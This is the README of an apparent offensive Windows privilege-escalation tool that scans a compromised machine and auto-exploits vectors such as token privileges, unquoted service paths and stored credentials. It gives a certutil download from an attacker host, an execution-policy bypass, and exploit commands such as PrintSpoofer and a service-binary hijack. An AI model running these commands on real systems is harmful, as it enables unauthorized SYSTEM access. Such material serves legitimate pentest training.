# AutoPrivEsc — Windows Privilege Escalation Scanner & Auto-Exploiter

Scans a compromised Windows machine for privilege escalation vectors and attempts to exploit each one automatically — going all the way to SYSTEM where possible.

Two versions included — use whichever is available on the target:

| File | Language | Use when |
|---|---|---|
| `autoprivesc_win.py` | Python 3 | Python is available |
| `AutoPrivEsc.ps1` | PowerShell | Python is not available (works on every Windows 7+) |

> For authorized use only. CTF, lab, and pentest environments exclusively.

---

## What Makes This Different

Most tools (WinPEAS, PowerUp) find vulnerabilities and stop.
AutoPrivEsc finds AND exploits — it gives you the exact command, or executes the payload automatically.

| Tool | Finds vectors | Auto-exploits |
|---|---|---|
| WinPEAS | Yes | No |
| PowerUp | Yes | Partial |
| AutoPrivEsc (both versions) | Yes | Yes |

---

## Vectors Covered

| # | Vector | Python | PowerShell |
|---|---|---|---|
| 1 | Token Privileges (SeImpersonate, SeDebug...) | Yes | Yes |
| 2 | AlwaysInstallElevated | Yes | Yes |
| 3 | Unquoted Service Paths | Yes | Yes |
| 4 | Weak Service Binary Permissions | Yes | Yes |
| 5 | Stored Credentials (cmdkey, AutoLogon, Unattend.xml) | Yes | Yes + PS history |
| 6 | AutoRun Registry Keys | Yes | Yes |
| 7 | Scheduled Tasks (SYSTEM, writable binary) | Yes | Yes |
| 8 | DLL Hijacking (writable PATH dirs) | Yes | Yes |
| 9 | Weak Registry Permissions on Services | No | Yes |

---

## Installation — Transfer to Target

Start a server on your attacker machine:

```bash
python3 -m http.server 8000
```

Download on target (cmd or PowerShell):

```cmd
certutil -urlcache -f http://<attacker-ip>:8000/autoprivesc_win.py autoprivesc_win.py
certutil -urlcache -f http://<attacker-ip>:8000/AutoPrivEsc.ps1 AutoPrivEsc.ps1
```

---

## Usage — Python Version

```cmd
:: Full scan + auto-exploit (default)
python autoprivesc_win.py

:: Scan only
python autoprivesc_win.py --scan

:: Save report to %TEMP%
python autoprivesc_win.py --report
```

## Usage — PowerShell Version

Before running, allow script execution:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

```powershell
:: Full scan + auto-exploit (default)
powershell -ep bypass -f AutoPrivEsc.ps1

:: Scan only
powershell -ep bypass -f AutoPrivEsc.ps1 -ScanOnly

:: Save report to %TEMP%
powershell -ep bypass -f AutoPrivEsc.ps1 -Report
```

The `-ep bypass` flag bypasses the execution policy restriction — required on most Windows machines.

---

## Example Output

```
=======================================================
  AutoPrivEsc — Windows PrivEsc (PowerShell)
=======================================================
  User   : IIS APPPOOL\DefaultAppPool
  Mode   : SCAN + EXPLOIT

=======================================================
  VECTOR 1 — Token Privileges (Potato Attacks)
=======================================================
  [FOUND] SeImpersonatePrivilege is present!
  [EXPLOIT] Recommended technique: PrintSpoofer / GodPotato -> SYSTEM

  Download PrintSpoofer: https://github.com/itm4n/PrintSpoofer/releases
  Run: PrintSpoofer.exe -i -c cmd.exe

=======================================================
  VECTOR 3 — Unquoted Service Paths
=======================================================
  [FOUND] Service: VulnerableService
          Path: C:\Program Files\Vulnerable App\service.exe
  [EXPLOIT] Writable injection point: C:\Program Files\Vulnerable.exe
  copy evil.exe "C:\Program Files\Vulnerable.exe"

=======================================================
  FINAL REPORT
=======================================================
  Vectors found   : 3
  Exploits ready  : 2

  EXPLOIT COMMANDS TO RUN:
    [TOKEN_PRIV]
    PrintSpoofer.exe -i -c cmd.exe

    [UNQUOTED_SERVICE]
    copy evil.exe "C:\Program Files\Vulnerable.exe"
```

---

## Key Concepts

**SeImpersonatePrivilege (Potato attacks)**
Service accounts (IIS, MSSQL, etc.) typically hold this privilege. Potato exploits trick a SYSTEM process into authenticating to a fake server, then steal and impersonate its token for SYSTEM access.

**Unquoted Service Path**
Windows resolves unquoted paths with spaces ambiguously. `C:\Program Files\App\svc.exe` without quotes causes Windows to try `C:\Program.exe` first — if we can write there, we win.

**AlwaysInstallElevated**
A policy setting that lets any user install MSI packages with SYSTEM privileges. When enabled in both HKLM and HKCU, a malicious MSI runs as SYSTEM.

**DLL Hijacking**
Windows searches for DLLs in the application directory before system directories. If a privileged process loads a DLL from a writable folder, planting a malicious DLL with the same name gives code execution.

---

## File Structure

```
autoprivesc-windows/
├── autoprivesc_win.py    # Python version
├── AutoPrivEsc.ps1       # PowerShell version (no Python needed)
├── requirements.txt      # No external deps for either version
└── README.md
```

---

## Possible Extensions

- Kerberoasting / AS-REP Roasting detection (domain-joined machines)
- LAPS misconfiguration check
- GPP passwords in SYSVOL
- Pass-the-Hash detection opportunities

---

## Disclaimer

For educational use in authorized environments only — CTF, HackTheBox, TryHackMe, and authorized pentests.

---

## License

MIT
